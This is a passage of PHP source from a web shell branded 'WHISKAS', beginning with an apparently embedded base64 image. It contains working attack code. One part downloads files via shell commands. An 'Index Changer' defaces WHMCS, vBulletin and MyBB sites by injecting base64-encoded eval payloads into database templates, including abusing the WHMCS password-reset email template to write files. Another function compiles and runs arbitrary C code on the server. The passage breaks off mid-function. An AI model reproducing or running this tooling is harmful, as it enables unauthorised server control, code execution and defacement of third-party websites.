ZQrkSPFI5Lj/F9/8B0NA2hU59kRkA8DKrHmxXeUcs5HSoxExf7b6/Xig2+nfEbNzPzp+440Pp/DkaSnFMAAsRcvnEiBAgMAoCAx+A+XxSOln0R88cYqbIuLm6OSbO3tnb/HXLBdXIgPA4px8FgECBAiMqMAvngzE4DdSbkkRfxsptvbmmpt+Y+P2XSN6yyNxWwaAkSiDmyBAgACBoyTwsxRxdU5pa0R848Vv/X+3phTip0PgGgCO0onzMgQIECAwUgI/iYhvNp10Qe/hh65a/86dT47U3Y3AzRgARqAIboEAAQIElkMgP5ZzfD81zSee7Dxxxcvecutjy7HKuL6mAWBcK+e+CRAgQGAxAv0Usb2f4v0zq3tff/4brntiMRfV8DkGgBqqbI8ECBCoXSDHD/vRf+/0VPcbL3zT9t21cwz2bwBwCggQIECgFoG/yym/d2qic4UhwABQy6G3TwIECBCI2BsR32ki/vxF5179vdrfOMgTAC1BgAABAhUJ5MdSxKc70X/f8eded29FGz9oqwaAmqtv7wQIEKhQIOe4von+/zjhnxx7aTpn21yFBPNbNgDUWnn7JkCAQL0Ce1Lkz6em854T3rr9jloZDAC1Vt6+CRAgULNAjpv60d/8krdfu6VWBgNArZW3bwIECNQtsCel+GDsmXvPi3/v+odrpDAA1Fh1eyZAgACBiMj/u+mmTSe85eof1shhAKix6vZMgAABAoOfgrstct786+dec2GNHAaAGqtuzwQIECAQKcXufj/++wU3XP2eTZvq+4uBBgBNQIAAAQLVCqSIP98789jmk974o6dqQzAA1FZx+yVAgACBfxRI8f7Z3ZObT/r9//tobSwGgNoqbr8ECBAgsJ9A+uhUL296wcarH6iNxQBQW8XtlwABAgT2F/h0N3qbanxbYAOARiBAgACBagVS5M/298bm9e+4ZmdtCAaA2ipuvwQIECDwSwEDQAuHYcdFp52dUpwXKZ3dwvKWJECAAAECYQBo4RAYAFpAtyQBAgQIPEPAANDCgTAAtIBuSQIECBAwADwt4GcANAMBAgQIVCvgCUALpfcEoAV0SxIgQICAJwCeAAzfBZ0mRbfbiU6niaZJkVKKwaOUwX/6IECAAIHxEeh2m2ump7vbuqnZdcS7TqkXKZ6KHE9FyoP/fCJyc0/00m0x/dAD6czts+Oz61/caWvfscbtCUCnaWJiohMT3SYmup35AaDbbaIZfPOf/z8DwLgdfvdLgACBJQj0IvLeiDT4mwFPRYrHI8c9kfPtEfnmSM0N0d17Qzrzez9Zwmu2+qkGgAX4B//Cn5zoxPTURExPTsx/0x/8y98HAQIECBB4WuDByPm2SOnvIvKV0etek17z7Z+Nuo4B4AgVGvxLf9XMxPw3/8mJ7vzjfh8ECBAgQOAwAoMY4abIeWtE51uRutenDX8zsn9kqLXvaKMcAQwe5w++4a9ZNRUz0xP+xa/XCRAgQGApAj+PFFdFzlsi0jfThq33L+XiUp9rADhAepDnz0xNxJrVUzE11Z3P+H0QIECAAIElCsxFzrdESp+N6H05bdh27xKvX/ZPb+272yg+AZj/5j89EevWTMfUZHfZ8S1AgAABAitdIP8ocjo/es0X0muv+PEo7dYA8HQ1BhAz05Oxbq1v/qN0QN0LAQIEVoDAbRHxvtjTuzCds+3xUdmPAeDpSgz+xf+ctTPzTwB8ECBAgACBoyqQ4nuR4t3RPLJ1VN4zwAAQMf/7/YPH/qumJ/2k/1E98V6MAAECBJ4W2BMRX42m9xfpVduuGQWV6geAwbv6rV0zPf9Df4M3+/FBgAABAgSWRSDlByKnj0fER0bhNwOqHwAGj/wHj/790N+yHHcvSoAAAQL7C+S4Kpr4s/ibrd9Mm6LfJk7VA0C308z/0N/qVVN+3a/NU2htAgQI1CPwWOR0QcTc+9JZ23a2ue2qB4BVM5NxzNqZ+Z8B8EGAAAECBAoJ3BgRm9KGrRcXWu+Qy1Q7AAze4Gfwr//BD//5K35tHkFrEyBAoDqB3ZHjAzGR3pPOvPLIf4VwGWmqHQAGf+BnkP0PngL4IECAAAEChQW+Er3e5vSa9n4joNoBwOP/wkfdcgQIECDwjwI53xCp2ZQ2XHlJWyzVDgCDR/+DJwD+wl9bR8+6BAgQqFgg58cixZ/Ft77z/rZ+G6DaAeCYdTPzA4APAgQIECDQikCK98Z0Z3M69dtPtLF+lQPA4If+BgPA4CmADwIECBAg0JLAJ2Ou2dzWHwmqcgAYPPYfDABrVxsAWjr0liVAgACBiC9HTpvTWVfe3AZGlQNAp9PM//7/4O1/fRAgQIAAgZYELo9Igx8E/Ic21q9yABi8A+Bz1s3EmlUGgDYOnTUJECBAYF5gW+Te5nTWtm1teBgA2lC3JgECBAgQMACks0ufAk8ASotbjwABAgQOIeAJQOljYQAoLW49AgQIEDAAPC2w46LTzk4pzovkCYC2IECAAIEqBTwBKF12TwBKi1uPAAECBDwB8ARAFxAgQIAAgYGAJwClz4EnAKXFrUeAAAECngB4AqALCBAgQICAJwB+CFAXECBAgEClAiKA0oUXAZQWtx4BAgQIiABEALqAAAECBAiIAEQAuoAAAQIEKhUQAZQuvAigtLj1CBAgQEAEIALQBQQIECBAQAQgAtAFBAgQIFCpgAigdOFFAKXFrUeAAAECIgARgC4gQIAAAQIiABGALiBAgACBSgVEAKULLwIoLW49AgQIEBABiAB0AQECBAgQEAGIAHQBAQIECFQqIAIoXXgRQGlx6xEgQICACEAEoAsIECBAgIAIQASgCwgQIECgUgERQOnCiwBKi1uPAAECBEQAIgBdQIAAAQIERAAiAF1AgAABApUKiABKF14EUFrcegQIECAgAhAB6AICBAgQICACEAHoAgIECBCoVEAEULrwIoDS4tYjQIAAARGACEAXECBAgAABEYAIQBcQIECAQKUCIoDShRcBlBa3HgECBAiIAEQAuoAAAQIECIgARAC6gAABAgQqFRABlC68CKC0uPUIECBAQAQgAtAFBAgQIEBABCAC0AUECBAgUKmACKB04UUApcWtR4AAAQIiABGALiBAgAABAiIAEYAuIECAAIFKBUQApQsvAigtbj0CBAgQEAGIAHQBAQIECBAQAYgAdAEBAgQIVCogAihdeBFAaXHrESBAgIAIQASgCwgQIECAgAhABKALCBAgQKBSARFA6cKLAEqLW48AAQIERAAiAF1AgAABAgREACIAXUCAAAEClQqIAEoXXgRQWtx6BAgQICACEAHoAgIECBAgIAIQAegCAgQIEKhUQARQuvAigNLi1iNAgAABEYAIQBcQIECAAAERgAhAFxAgQIBApQIigNKFFwGUFrceAQIECIgARAC6gAABAgQIiABEALqAAAECBCoVEAGULrwIoLS49QgQIEBABCAC0AUECBAgQEAEIALQBQQIECBQqYAIoHThRQClxa1HgAABAiIAEYAuIECAAAECIgARgC4gQIAAgUoFRAClCy8CKC1uPQIECBAQAYgAdAEBAgQIEBABiAB0AQECBAhUKiACKF14EUBpcesRIECAgAhABKALCBAgQICACEAEoAsIECBAoFIBEUDpwosASotbjwABAgREACIAXUCAAAECBEQAIgBdQIAAAQKVCogAShdeBFBa3HoECBAgIAIQAegCAgQIECAgAhAB6AICBAgQqFRABFC68CKA0uLWI0CAAAERgAhAFxAgQIAAARGACEAXECBAgEClAiKA0oUXAZQWtx4BAgQIiABEALqAAAECBAiIAEQAuoAAAQIEKhUQAZQuvAigtLj1CBAgQEAEIALQBQQIECBAQAQgAtAFBAgQIFCpgAigdOFFAKXFrUeAAAECIgARgC4gQIAAAQIiABGALiBAgACBSgVEAKULLwIoLW49AgQIEBABiAB0AQECBAgQEAGIAHQBAQIECFQqIAIoXXgRQGlx6xEgQICACEAEoAsIECBAgIAIQASgCwgQIECgUgERQOnCiwBKi1uPAAECBEQAIgBdQIAAAQIERAAiAF1AgAABApUKiABKF14EUFrcegQIECAgAhAB6AICBAgQICACEAHoAgIECBCoVEAEULrwIoDS4tYjQIAAARGACEAXECBAgAABEYAIQBcQIECAQKUCIoDShRcBlBa3HgECBAiIAEQAuoAAAQIECIgARAC6gAABAgQqFRABlC68CKC0uPUIECBAQAQgAtAFBAgQIEBABCAC0AUECBAgUKmACKB04UUApcWtR4AAAQIiABGALiBAgAABAiIAEYAuIECAAIFKBUQApQsvAigtbj0CBAgQEAGIAHQBAQIECBAQAYgAdAEBAgQIVCogAihdeBFAaXHrESBAgIAIQASgCwgQIECAgAhABKALCBAgQKBSARFA6cKLAEqLW48AAQIERAAiAF1AgAABAgREACIAXUCAAAEClQqIAEoXXgRQWtx6BAgQICACEAHoAgIECBAgIAIQAegCAgQIEKhUQARQuvAigNLi1iNAgAABEYAIQBcQIECAAAERgAhAFxAgQIBApQIigNKFFwGUFrceAQIECIgARAC6gAABAgQIiABEALqAAAECBCoVEAGULrwIoLS49QgQIEBABCAC0AUECBAgQEAEIALQBQQIECBQqYAIoHThRQClxa1HgAABAiIAEYAuIECAAAECIgARgC4gQIAAgUoFRAClCy8CKC1uPQIECBAQAYgAdAEBAgQIEBABiAB0AQECBAhUKiACKF14EUBpcesRIECAgAhABKALCBAgQICACEAEoAsIECBAoFIBEUDpwosASotbjwABAgREACIAXUCAAAECBEQAIgBdQIAAAQKVCogAShdeBFBa3HoECBAgIAIQAegCAgQIECAgAhAB6AICBAgQqFRABFC68CKA0uLWI0CAAAERgAhAFxAgQIAAARGACEAXECBAgEClAiKA0oUXAZQWtx4BAgQIiABEALqAAAECBAiIAEQAuoAAAQIEKhUQAZQuvAigtLj1CBAgQEAEIALQBQQIECBAQAQgAtAFBAgQIFCpgAigdOFFAKXFrUeAAAECIgARgC4gQIAAAQIiABGALiBAgACBSgVEAKULLwIoLW49AgQIEBABiAB0AQECBAgQEAGIAHQBAQIECFQqIAIoXXgRQGlx6xEgQICACEAEoAsIECBAgIAIQASgCwgQIECgUgERQOnCiwBKi1uPAAECBEQAIgBdQIAAAQIERAAiAF1AgAABApUKiABKF14EUFrcegQIECAgAhAB6AICBAgQICACEAHoAgIECBCoVEAEULrwIoDS4tYjQIAAARGACEAXECBAgAABEYAIQBcQIECAQKUCIoDShRcBlBa3HgECBAiIAEQAuoAAAQIECIgARAC6gAABAgQqFRABlC68CKC0uPUIECBAQAQgAtAFBAgQIEBABCAC0AUECBAgUKmACKB04UUApcWtR4AAAQIiABGALiBAgAABAiIAEYAuIECAAIFKBUQApQsvAigtbj0CBAgQEAGIAHQBAQIECBAQAYgAdAEBAgQIVCogAihdeBFAaXHrESBAgIAIQASgCwgQIECAgAhABKALCBAgQKBSARFA6cKLAEqLW48AAQIERAAiAF1AgAABAgREACIAXUCAAAEClQqIAEoXXgRQWtx6BAgQICACEAHoAgIECBAgIAIQAegCAgQIEKhUQARQuvAigNLi1iNAgAABEYAIQBcQIECAAAERgAhAFxAgQIBApQIigNKFFwGUFrceAQIECIgARAC6gAABAgQIiABEALqAAAECBCoVEAGULrwIoLS49QgQIEBABCAC0AUECBAgQEAEIALQBQQIECBQqYAIoHThRQClxa1HgAABAiIAEYAuIECAAAECIgARgC4gQIAAgUoFRAClCy8CKC1uPQIECBAQAYgAdAEBAgQIEBABiAB0AQECBAhUKiACKF14EUBpcesRIECAgAhABKALCBAgQICACEAEoAsIECBAoFIBEUDpwosASotbjwABAgREACIAXUCAAAECBEQAIgBdQIAAAQKVCogAShdeBFBa3HoECBAgIAIQAegCAgQIECAgAhAB6AICBAgQqFRABFC68CKA0uLWI0CAAAERgAhAFxAgQIAAARGACEAXECBAgEClAiKA0oUXAZQWtx4BAgQIiABEALqAAAECBAiIAEQAuoAAAQIEKhUQAZQuvAigtLj1CBAgQEAEIALQBQQIECBAQAQgAtAFBAgQIFCpgAigdOFFAKXFrUeAAAECIgARgC4gQIAAAQIiABGALiBAgACBSgVEAKULLwIoLW49AgQIEBABiAB0AQECBAgQEAGIAHQBAQIECFQqIAIoXXgRQGlx6xEgQICACEAEoAsIECBAgIAIQASgCwgQIECgUgERQOnCiwBKi1uPAAECBEQAIgBdQIAAAQIERAAiAF1AgAABApUKiABKF14EUFrcegQIECAgAhAB6AICBAgQICACEAHoAgIECBCoVEAEULrwIoDS4tYjQIAAARGACEAXECBAgAABEYAIQBcQIECAQKUCIoDShRcBlBa3HgECBAiIAEQAuoAAAQIECIgARAC6gAABAgQqFRABlC68CKC0uPUIECBAQAQgAtAFBAgQIEBABCAC0AUECBAgUKmACKB04UUApcWtR4AAAQIiABGALiBAgAABAiIAEYAuIECAAIFKBa6MSJvThiv/Txv7T20sOlhzx0WnnZ1SnGcAaKsC1iVAgACBlgW+Gk2zKb3qim1+OdoAAAlnSURBVGvauA8DQBvq1iRAgAABAhGfi9TZlF797R1tYBgA2lC3JgECBAgQSPnDsWZiUzr58ofawDAAtKFuTQIECBCoXWA2Unp3dB7+n+nM7bNtYBgA2lC3JgECBAjULnBf5Lw5nfWd89uCaG0AuPui01/Xb/KmiPit0pvvdps4Zu1MrF41VXpp6xEgQIAAgYHA30bEprRh63fb4mhtALjzslNf1fSb8yLijaU3PznRjWPWzcTM9ETppa1HgAABAgRyRHwmZtPm9Lor726Lo7UB4O5LT3lFzp3zcsTbS29+ZmoinrNuJqYmu6WXth4BAgQIEHhwPv9ffexH0isu2tsWR2sDwH1fecWLer2J8/oR/7705levmpyPALrdTumlrUeAAAECtQvkvDVSs6mtNwDax9/aAHDP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');
}else{
$ext = explode('.',$file);
$ext = end($ext);
$ext = strtolower($ext);
return (in_array($ext,$types)?$s.$ext.'.png':$s.'notfound.png');
}
}
function WHISKASdlfile(){
if(isset($_POST['c'],$_POST['file'])){
$basename = rawurldecode(basename($_POST['file']));
$_POST['file'] = str_replace("//", "/", $_POST['c'].'/'.$basename);
$WHISKAS_canruncmd = _WHISKAS_can_runCommand(true,true);
if(@is_file($_POST['file']) && @is_readable($_POST['file']) || $WHISKAS_canruncmd){
ob_start("ob_gzhandler", 4096);
header("Content-Disposition: attachment; filename=\"".addslashes($basename)."\"");
header("Content-Type: application/octet-stream");
if($GLOBALS["glob_chdir_false"]){
	$randname = $basename.rand(111,9999);
	$scriptpath = dirname($_SERVER["SCRIPT_FILENAME"]);
	$filepath = $scriptpath."/".$randname;
	if(_WHISKAS_is_writable($scriptpath)){
		WHISKASEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
		readfile($filepath);
		@unlink($filepath);
	}else{
		WHISKASEx("cat '".addslashes($_POST["file"])."'");
	}
}else{
	readfile($_POST['file']);
}
}else echo('Error...!');}}
function __WHISKAS_set_cookie($key, $value){
	$_COOKIE[$key] = $value;
	@setcookie($key, $value, time()+(86400 * 7), '/');
}
function __pre(){return('<pre id="strOutput" style="margin-top:5px" class="ml1">');}
function WHISKASIndexChanger(){
WHISKAShead();

echo '<div class=header><center><p><div class="txtfont_header">| Index Changer |</div></p><h3><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,null,null,\'whmcs\')">| Whmcs | </a><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,\'vb\',null)">| vBulletin | </a><a href=javascript:void(0) onclick="g(\'IndexChanger\',null,null,\'mybb\')">| MyBB | </a></h3></center>';
if(isset($_POST['WHISKAS3'])&&($_POST['WHISKAS3'] == 'whmcs')){
echo __pre();

echo "<center><center><div class='txtfont_header'>| Whmcs |</div>
<p><center>".getConfigHtml('whmcs')."<form onSubmit=\"g('IndexChanger',null,null,null,'whmcs',this.fname.value,this.path.value,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value); return false;\">
";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'URL', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'File Name', 'inputName' => 'fname', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td6' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
);
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name=index rows='19' cols='103'><title>Hacked By WHISKAS</title><b>Hacked By WHISKAS</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['WHISKAS6'])){
$s0levisible="Powered By WHISKAS";
$dbu = $_POST['WHISKAS6'];
$path = $_POST['WHISKAS5'];
$fname = $_POST['WHISKAS4'];
$dbn = $_POST['WHISKAS7'];
$dbp = $_POST['WHISKAS8'];
$dbh = $_POST['WHISKAS9'];
$index = $_POST['WHISKAS10'];
$index = str_replace("\'","'",$index);
$deface = '$x = base64_decode("'.__ZW5jb2Rlcg($index).'"); $solevisible = fopen("'.$fname.'","w"); fwrite($solevisible,$x);';
$saveData = __ZW5jb2Rlcg($deface);
$Def = '{php}eval(base64_decode("'.$saveData.'"));{/php}';
if(!empty($dbh)&&!empty($dbu)&&!empty($dbn)&&!empty($index)){
$conn=@mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
$soleSave=@mysqli_query($conn,"select message from tblemailtemplates where name='Password Reset Validation'");
$soleGet = mysqli_fetch_assoc($soleSave);
$tempSave1 = $soleGet['message'];
$tempSave = str_replace("'","\'",$tempSave1);
$inject = "UPDATE tblemailtemplates SET message='$Def' WHERE name='Password Reset Validation'";
$result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
$create = "insert into tblclients (email) values('Whiskas@fbi.gov')";
$result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
if(function_exists('curl_version')){
$WHISKASSole = new WHISKASCURL(true);
$saveurl = $WHISKASSole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$WHISKASSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=Whiskas@fbi.gov");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
__alert('File Created...');
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$path."/".$fname."'>Click Here !</a></font></b></center><br><br>";
}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>Whiskas@fbi.gov</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
}}}}
if(isset($_POST['WHISKAS1']) && ($_POST['WHISKAS1'] == 'vb')){
echo __pre();

echo "<center><center><div class='txtfont_header'>| vBulletin |</div>
<p><center>".getConfigHtml('vb')."<form onSubmit=\"g('IndexChanger',null,'vb',this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value,this.prefix.value,'>>'); return false;\">
";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' =>'dbh', 'id' =>'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Prefix', 'inputName' => 'prefix', 'id' => 'db_prefix', 'inputValue' => '', 'inputSize' => '50')
);
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name='index' rows='19' cols='103'><title>WHISKAS</title><b>WHISKAS</b></textarea><br>
<input type='submit' value=' '></form></center></center>";
if($_POST['WHISKAS8']=='>>'){
$s0levisible="Powered By Solevisible";
$dbu = $_POST['WHISKAS2'];
$dbn = $_POST['WHISKAS3'];
$dbp = $_POST['WHISKAS4'];
$dbh = $_POST['WHISKAS5'];
$index = $_POST['WHISKAS6'];
$prefix = $_POST['WHISKAS7'];
$index=str_replace("\'","'",$index);
$set_index = "{\${eval(base64_decode(\'";
$set_index .= __ZW5jb2Rlcg("echo \"$index\";");
$set_index .= "\'))}}{\${exit()}}";
if(!empty($dbh)&&!empty($dbu)&&!empty($dbn)&&!empty($index)){
$conn=@mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
$loli1 = "UPDATE ".$prefix."template SET template='".$set_index."".$s0levisible."' WHERE title='spacer_open'";
$loli2 = "UPDATE ".$prefix."template SET template='".$set_index."".$s0levisible."' WHERE title='FORUMHOME'";
$loli3 = "UPDATE ".$prefix."style SET css='".$set_index."".$s0levisible."', stylevars='', csscolors='', editorstyles=''";
@mysqli_query($conn,$loli1) or die (mysqli_error($conn));
@mysqli_query($conn,$loli2) or die (mysqli_error($conn));
@mysqli_query($conn,$loli3) or die (mysqli_error($conn));
__alert('VB index changed...!');
}
}
}
if(isset($_POST['WHISKAS2']) && ($_POST['WHISKAS2'] == 'mybb')) {
echo __pre();

echo "<center><center><div class='txtfont_header'>| Mybb |</div>
<p><center>".getConfigHtml('mybb')."<form onSubmit=\"g('IndexChanger',null,'null','mybb',null,null,null,this.mybbdbh.value,this.mybbdbu.value,this.mybbdbn.value,this.mybbdbp.value,this.mybbindex.value); return false;\" method=POST action=''>
";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'mybbdbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'mybbdbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User', 'inputName' => 'mybbdbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass', 'inputName' => 'mybbdbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
);
create_table($table);
echo "<br><div class='txtfont'>| Your Index |</div><br>
<textarea name=mybbindex rows='19' cols='103'>
<title>Hacked By WHISKAS</title><b>Hacked By WHISKAS</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['WHISKAS6'])){
$mybb_dbh = $_POST['WHISKAS6'];
$mybb_dbu = $_POST['WHISKAS7'];
$mybb_dbn = $_POST['WHISKAS8'];
$mybb_dbp = $_POST['WHISKAS9'];
$mybb_index = $_POST['WHISKAS10'];
if(!empty($mybb_dbh)&&!empty($mybb_dbu)&&!empty($mybb_dbn)&&!empty($mybb_index)){
$conn=@mysqli_connect($mybb_dbh,$mybb_dbu,$mybb_dbp,$mybb_dbn) or die(mysqli_error($conn));
$prefix="mybb_";
$loli7 = "UPDATE ".$prefix."templates SET template='".$mybb_index."' WHERE title='index'";
$result =@mysqli_query($conn,$loli7) or die (mysqli_error($conn));
__alert('MyBB index changed...!');
}
}
}
echo "</div>";
WHISKASfooter();
}
function __get_resource($content){
return @gzinflate(__ZGVjb2Rlcg($content));
}
function __write_file($file, $content){
if($fh = @fopen($file, "wb")){
if(fwrite($fh, $content)!==false) return true;
}
return false;
}
function bcinit($evalType, $evalCode, $evalOptions, $evalArguments){
$res = "<font color='red'>[ Success...! ]</font>";
$err = "<font color='red'>[ Failed...! ]</font>";
if($evalOptions!="") $evalOptions = $evalOptions." ";
if($evalArguments!="") $evalArguments = " ".$evalArguments;
if($evalType=="c"){
$tmpdir = WHISKAS_TEMPDIR;
chdir($tmpdir);
if(is_writable($tmpdir)){
$uniq = substr(md5(time()),0,8);
$filename = $evalType.$uniq.".c";
$path = $filename;
if(__write_file($path, $evalCode)){
$ext = ($GLOBALS['sys']=='win')? ".exe":".out";
$pathres = $filename.$ext;
$evalOptions = "-o ".$pathres." ".$evalOptions;
$cmd = "gcc ".$evalOptions.$path;
WHISKASEx($cmd);
if(is_file($pathres)){
if(chmod($pathres, 0755)){
$cmd = $pathres.$evalArguments;
WHISKASEx($cmd);
